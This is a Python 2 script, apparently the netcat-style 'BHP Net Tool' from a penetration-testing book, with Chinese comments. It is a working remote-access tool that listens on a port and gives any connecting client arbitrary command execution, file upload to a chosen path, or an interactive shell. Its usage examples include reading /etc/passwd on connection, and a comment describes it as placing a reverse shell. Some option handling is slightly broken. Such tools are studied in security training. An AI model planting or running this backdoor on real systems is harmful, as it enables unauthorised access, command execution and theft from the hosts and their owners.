#-- coding:utf-8 --
import sys
import socket
import getopt
import threading
import subprocess

#全局变量
listen = False
command =False
upload=False
execute=""
target=""
upload_destination=""
port=0

def usage():
    print "BHP Net Tool"
    print
    print "Usage:bhpnet.py -t target_host -p port"
    print "-l --listen -listen on [host]:[port] for incoming connections"
    print  "-e --execute=file_to_run - execute the given file upon receiving aconnection "
    print "-c --command -initialize a command shell"
    print "-u --upload=destination -upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 11 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 11 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 11 -l -e=\"cat /etc/passwd\""
    print "echo 'sdfsdf' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    if not len(sys.argv[1:]):
        usage()
    try:
        opts,args=getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute",\
                                                            "target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    for o,a in opts:
        if o in("-h","-help"):
            usage()
        elif o in("-l","--listen"):
            listen=True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination=a
        elif o in ("-t", "--target"):
            target=a
        elif o in ("-p", "--port"):
            port=int(a)
        else:
            assert False,"unhandled option"
    if not listen and len(target) and port>0:
        #从命令行读取内存数据
        #这里将阻塞额，所有不在向标准输入发送数据时发送ctrl -D
        buffer=sys.stdin.read()
        #send data
        client_sender(buffer)
    #我们开始监听并上传文件，执行命令
    #放置一个反弹shell
    #取决于上面的命令行选项
    if listen:
        server_loop()

def client_sender(buffer):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        #connect target
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
            while True:
                recv_len=1
                response=""
                while recv_len:
                    data=client.recv(4096)
                    recv_len=len(data)
                    response+=data
                    if recv_len<4096:
                        break
                print response
                buffer=raw_input("")
                buffer+="\n"
                client.send(buffer)
    except:
        print "exception exiting."
    finally:
        client.close()


def server_loop():
    global target
    #如果没有定义目标，那么我们监听所有的接口
    if not len(target):
        target="0.0.0.0"
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    while True:
        client_socket,addr=server.accept()
        client_thread=threading.Thread(target=client_handler,\
                                       args=(client_socket,))
        client_thread.start()

def run_command(command):
    #去掉末尾的空格
    command=command.rstrip()
    try:
        output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output="failed to execute command.\r\n"
    return output

def client_handler(client_socket):
    global  upload
    global execute
    global command
    if len(upload_destination):
        file_buffer=""
        while True:
            data=client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer+=data
        try:
            with open(upload_destination,'wb') as file_descriptor:
                 file_descriptor.write(file_buffer)
            client_socket.send("success save file to %s\r\n"%upload_destination)
        except:
            client_socket.send("fail save file to %s\r\n"%upload_destination)
    if len(execute):
        output=run_command(execute)
        client_socket.send(output)
    if command:
        while True:
            client_socket.send("<BHP:#>")
            cmd_buffer=""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024)
            response=run_command(cmd_buffer)
            client_socket.send(response)

if __name__ == '__main__':
    main()
    # print 1 in (2,4)